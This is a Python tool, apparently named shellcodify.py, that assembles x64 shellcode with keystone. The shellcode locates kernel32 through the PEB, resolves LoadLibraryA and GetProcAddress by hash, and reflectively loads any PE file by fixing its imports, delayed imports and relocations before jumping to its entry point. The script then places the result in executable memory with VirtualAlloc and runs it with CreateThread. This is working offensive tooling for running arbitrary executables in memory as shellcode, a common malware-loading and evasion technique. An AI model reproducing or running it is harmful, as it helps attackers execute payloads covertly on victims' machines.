import ctypes, struct
from keystone import *
import sys


CODE = (
"find_kernel32:"
" sub rsp, 0x8;"
" xor rdx, rdx;"
" mov rax, gs:[rdx+0x60];"		# RAX = PEB Address
" mov rsi,[rax+0x18];"			# RSI = Address of _PEB_LDR_DATA
" mov rsi,[rsi + 0x30];"		# RSI = Address of the InInitializationOrderModuleList
" mov r9, [rsi];"			# python.exe
" mov r9, [r9];"			# ntdll.dll
" mov r9, [r9+0x10];"			# kernel32.dll
" jmp function_stub;"			# Jump to func call stub

"parse_module:"				# Parsing DLL file in memory
" mov ecx, dword ptr [r9 + 0x3c];"	# R9 = Base address of the module, ECX = NT header offset
" xor r15, r15;"
" mov r15b, 0x88;"			# Offset to Export Directory   
" add r15, r9;"				
" add r15, rcx;"			# R15 points to Export Directory
" mov r15d, dword ptr [r15];"		# R15 = RVA of export directory
" add r15, r9;"				# R15 = VA of export directory
" mov ecx, dword ptr [r15 + 0x18];"	# ECX = # of function names as an index value
" mov r14d, dword ptr [r15 + 0x20];"	# R14 = RVA of ENPT
" add r14, r9;"				# R14 = VA of ENPT

"search_function:"			# Search for a given function
" jrcxz not_found;"			# If RCX = 0, the given function is not found
" dec ecx;"				# Decrease index by 1
" xor rsi, rsi;"
" mov esi, [r14 + rcx*4];"		# RVA of function name
" add rsi, r9;"				# RSI points to function name string

"function_hashing:"			# Hash function name function
" xor rax, rax;"
" xor rdx, rdx;"
" cld;"					# Clear DF flag

"iteration:"				# Iterate over each byte
" lodsb;"				# Copy the next byte of RSI to Al
" test al, al;"				# If reaching the end of the string
" jz compare_hash;"			# Compare hash
" ror edx, 0x0d;"			# Part of hash algorithm
" add edx, eax;"			# Part of hash algorithm
" jmp iteration;"			# Next byte

"compare_hash:"				# Compare hash
" cmp edx, r8d;"			# R8 = Supplied function hash
" jnz search_function;"			# If not equal, search the previous function (index decreases)
" mov r10d, [r15 + 0x24];"		# Ordinal table RVA
" add r10, r9;"				# R10 = Ordinal table VMA
" movzx ecx, word ptr [r10 + 2*rcx];"	# Ordinal value -1
" mov r11d, [r15 + 0x1c];"		# RVA of EAT
" add r11, r9;"				# r11 = VA of EAT
" mov eax, [r11 + 4*rcx];"		# RAX = RVA of the function
" add rax, r9;"				# RAX = VA of the function
" ret;"
"not_found:"
" xor rax, rax;"			# Return zero
" ret;"

"function_stub:"			# Achieve PIC and elminiate 0x00 byte
" mov rbp, r9;"				# RBP stores base address of Kernel32.dll
" mov r8d, 0xec0e4e8e;"			# LoadLibraryA Hash
" call parse_module;"			# Search LoadLibraryA's address
" mov r12, rax;"			# R12 stores the address of LoadLibraryA function
" mov r8d, 0x7c0dfcaa;"			# GetProcAddress Hash
" call parse_module;"			# Search GetProcAddress's address
" mov r13, rax;"			# R13 stores the address of GetProcAddress function


"fix_iat:"  				# Init necessary variable for fixing IAT
" xor rsi, rsi;"
" xor rdi, rdi;"
" lea rbx, [rip+0x1fe];"		# RBX points to PE part of shellcode, now 346 bytes in total
" xor rax, rax;"
" mov eax, [rbx+0x3c];"   		# EAX contains e_lfanew
" add rax, rbx;"          		# RAX points to NT Header
" mov esi, [rax+0x90];"  		# ESI = ImportDir RVA
" add rsi, rbx;"         		# RSI points to ImportDir
" mov edi, [rax+0x94];"   		# EDI = ImportDir Size
" add rdi, rsi;"          		# RDI = ImportDir VA + Size


"loop_imported_module:"
" cmp rsi, rdi;"          		# Compare current descriptor with the end of import directory
" je module_loop_end;"    		# If equal, exit the loop
" xor rdx ,rdx;"
" mov edx, [rsi];"        		# EDX = ILT RVA (32-bit)
" test rdx, rdx;"         		# Check if ILT RVA is zero (end of descriptors)
" je module_loop_end;"    		# If zero, exit the loop
" xor rcx, rcx;"
" mov ecx, [rsi+0xc];"    		# RCX = Module Name RVA
" add rcx, rbx;"          		# RCX points to Module Name
" call r12;"              		# Call LoadLibraryA
" xor rdx ,rdx;"			
" mov edx, [rsi];"        		# Restore ILT RVA
" add rdx, rbx;"          		# RDX points to ILT
" xor r8, r8;"				
" mov r8d, [rsi+0x10];"   		# R8 = IAT RVA	
" add r8, rbx;"           		# R8 points to IAT
" mov rcx, rax;"          		# Module handle for GetProcAddress
" mov r14, rdx;"			# Backup ILT Address
" mov r15, r8;"				# Backup IAT Address

"loop_imported_func:"
" mov rdx, r14;"			# Restore ILT address + processed entries
" mov r8, r15;"				# Restore IAT Address + processed entries
" mov rdx, [rdx];"        		# RDX = Ordinal or RVA of HintName Table
" test rdx, rdx;"         		# Check if it's the end of the ILT/IAT
" je next_descriptor;"    		# If zero, move to the next descriptor
" mov r9, 0x8000000000000000;"
" test rdx, r9;"  			# Check if it is import by ordinal (highest bit set)
" mov rbp, rcx;"			# Save module base address
" jnz resolve_by_ordinal;"		# If set, resolve by ordinal

"resolve_by_name:"
" add rdx, rbx;"          		# RDX = HintName Table VA
" add rdx, 2;"		  		# RDX points to Function Name
" call r13;"              		# Call GetProcAddress
" jmp update_iat;"        		# Go to update IAT

"resolve_by_ordinal:"
" mov r9, 0x7fffffffffffffff;"
" and rdx, r9;"			   	# RDX = Ordinal number
" call r13;"              		# Call GetProcAddress with ordinal

"update_iat:"
" mov rcx, rbp;"          		# Restore module base address
" mov r8, r15;"				# Restore IAT Address + processed entries
" mov [r8], rax;"         		# Write the resolved address to the IAT
" add r15, 0x8;"             		# Move to the next IAT entry (64-bit addresses)
" add r14, 0x8;"		  	# Movce to the next ILT entry
" jmp loop_imported_func;"		# Repeat for the next function

"next_descriptor:"
" add rsi, 0x14;"         		# Move to next import descriptor
" jmp loop_imported_module;"  		# Continue loop

"module_loop_end:"



"fix_delayed_iat:"
" xor rax, rax;"
" mov eax, [rbx+0x3c];"			# EAX contains e_lfanew
" add rax, rbx;"			# RAX points to NT Header
" mov esi, [rax+0xe0];"			# ESI = DelayedImportDir RVA
" test esi, esi;"			# If RVA = 0?
" jz fix_reloc;"			# Skip delay import table fix
" add rsi, rbx;"			# RSI points to DelayedImportDir

"loop_delayed_module:"
" xor rcx, rcx;"			
" mov ecx, [rsi+4];"			# RCX = Module name string RVA
" test rcx, rcx;"			# If RVA = 0, then all modules are processed
" jz delayed_module_loop_end;"		# Exit the module loop
" add rcx, rbx;"			# RCX = Module name
" call r12;"				# Call LoadLibraryA
" mov rcx, rax;"			# Module handle for GetProcAddress for 1st arg
" xor r8, r8;"				
" xor rdx, rdx;"
" mov edx, [rsi+0x10];"			# EDX = INT RVA
" add rdx, rbx;"			# RDX points to INT
" mov r8d, [rsi+0xc];"			# R8 = IAT RVA
" mov r8, rbx;"				# R8 points to IAT
" mov r14, rdx;"			# Backup INT Address
" mov r15, r8;"				# Backup IAT Address

"loop_delayed_imported_function:"
" mov rdx, r14;"			# Restore INT Address + processed data
" mov r8, r15;"				# Restore IAT Address + processed data
" mov rdx, [rdx];"			# RDX = Name Address RVA
" test rdx, rdx;"			# If Name Address value is 0, then all functions are fixed
" jz next_delayed_module;"		# Process next module
" mov r9, 0x8000000000000000;"
" test rdx, r9;"			# Check if it is import by ordinal (highest bit set of NameAddress)
" mov rbp, rcx;"			# Save module base address
" jnz resolve_delayed_by_ordinal;"	# If set, resolve by ordinal

"resolve_delayed_by_name:"
" add rdx, rbx;"			# RDX points to NameAddress Table
" add rdx, 2;"				# RDX points to Function Name
" call r13;"				# Call GetProcAddress
" jmp update_delayed_iat;"		# Go to update IAT

"resolve_delayed_by_ordinal:"
" mov r9, 0x7fffffffffffffff;"
" and rdx, r9;"				# RDX = Ordinal number
" call r13;"				# Call GetProcAddress with ordinal


"update_delayed_iat:"
" mov rcx, rbp;"			# Restore module base address
" mov r8, r15;"				# Restore current IAT address + processed
" mov [r8], rax;"			# Write the resolved address to the IAT
" add r15, 0x8;"			# Move to the next IAT entry (64-bit addresses)
" add r14, 0x8;"			# Movce to the next INT entry
" jmp loop_delayed_imported_function;"	# Repeat for the next function



"next_delayed_module:"
" add rsi, 0x20;"			# Move to next delayed imported module
" jmp loop_delayed_module;"		# Continue loop


"delayed_module_loop_end:"

"fix_reloc:"				# Save RBX //dq rbx+21b0 l46
" xor rsi, rsi;"
" xor rdi, rdi;"
" xor rax, rax;"
" xor r8, r8;"				# Empty R8 to save page RVA
" xor r9, r9;"				# Empty R9 to place block size
" xor r15, r15;"
" mov eax, [rbx+0x3c];"   		# EAX contains e_lfanew
" add rax, rbx;"          		# RAX points to NT Header
" mov esi, [rax+0xb0];"  		# ESI = BaseReloc RVA
" add rsi, rbx;"         		# RSI points to BaseReloc
" mov edi, [rax+0xb4];"   		# EDI = BaseReloc Size
" add rdi, rsi;"          		# RDI = BaseReloc VA + Size
" mov r15d, [rax+0x28];"		# R15 = Entry point RVA
" add r15, rbx;"			# R15 = Entry point
" mov r14, [rax+0x30];"			# R14 = Preferred address
" sub r14, rbx;"			# R14 = Delta address 
" mov [rax+0x30], rbx;"			# Update Image Base Address
" mov r8d, [rsi];"			# R8 = First block page RVA
" add r8, rbx;"				# R8 points to first block page (Should add an offset later)
" mov r9d, [rsi+4];"			# First block's size
" xor rax, rax;"
" xor rcx, rcx;"

"loop_reloc_block:"
" cmp rsi, rdi;"          		# Compare current block with the end of BaseReloc
" jge reloc_fixed_end;"    		# If equal, exit the loop
" xor r8, r8;"
" mov r8d, [rsi];"			# R8 = Current block's page RVA
" add r8, rbx;"				# R8 points to current block page (Should add an offset later)
" mov r11, r8;"				# Backup R8
" xor r9, r9;"
" mov r9d, [rsi+4];"			# R9 = Current block size
" add rsi, 8;"				# RSI points to the 1st entry, index for inner loop for all entries
" mov rdx, rsi;"
" add rdx, r9;"
" sub rdx, 8;"				# RDX = End of all entries in current block

"loop_reloc_entries:"
" cmp rsi, rdx;"			# If we reached the end of current block
" jz next_block;"			# Move to next block
" xor rax, rax;"
" mov ax, [rsi];"			# RAX = Current entry value
" test rax, rax;"			# If entry value is 0
" jz next_block;"			# Reach the end of entry
" mov r10, rax;"			# Copy entry value to R10
" and eax, 0xfff;"			# Offset, 12 bits
" shr r10d, 12;"			# Type value, 4 bits
" add r8, rax;"				# Added an offset



"update_entry:"
" sub [r8], r14;"			# Update the address
" mov r8, r11;"				# Restore r8
" add rsi, 2;"				# Move to next entry by adding 2 bytes
" jmp loop_reloc_entries;"

"next_block:"
" add rsi, 2;"	
" jmp loop_reloc_block;"

"reloc_fixed_end:"
" sub rsp,8;"                   		# 
" nop;"
" nop;"
" nop;"
" nop;"
" nop;"
" nop;"
" nop;"
" nop;"
" jmp r15;"
)


def read_pe_file(file_path):
    with open(file_path, 'rb') as file:
        return bytearray(file.read())

def print_byte_array(byte_array, line_length=20, max_lines=30):
    for i in range(min(max_lines, len(byte_array) // line_length)):
        line = byte_array[i * line_length:(i + 1) * line_length]
        formatted_line = ''.join([f"\\x{b:02x}" for b in line])
        print(f"buf += b\"{formatted_line}\"")
    print("......"+str(len(byte_array)-600) +" more bytes......")

if len(sys.argv)!=2:
        print("Usage: python3 shellcodify.py calc.bin")
pe_file_path = sys.argv[1]
pe_array = read_pe_file(pe_file_path)


ks = Ks(KS_ARCH_X86, KS_MODE_64)
encoding, count = ks.asm(CODE)
#print("%d instructions..." % count)

sh = b""
for e in encoding:
    sh += struct.pack("B", e)
shellcode = bytearray(sh)
print("Shellcode Stub size: "+str(len(shellcode))+" bytes")
shellcode = shellcode + pe_array
print("Shellcoded PE's size: "+str(len(shellcode))+" bytes")
sc = ""
#print("Payload size: "+str(len(encoding))+" bytes")


print_byte_array(shellcode)


ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                          ctypes.c_int(len(shellcode)),
                                          ctypes.c_int(0x3000),
                                          ctypes.c_int(0x40))

buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(ptr),
                                     buf,
                                     ctypes.c_int(len(shellcode)))
print("Shellcode located at address %s" % hex(ptr))
input("...ENTER TO EXECUTE SHELLCODE...")

ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.c_uint64(ptr),
                                         ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.pointer(ctypes.c_int(0)))

ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
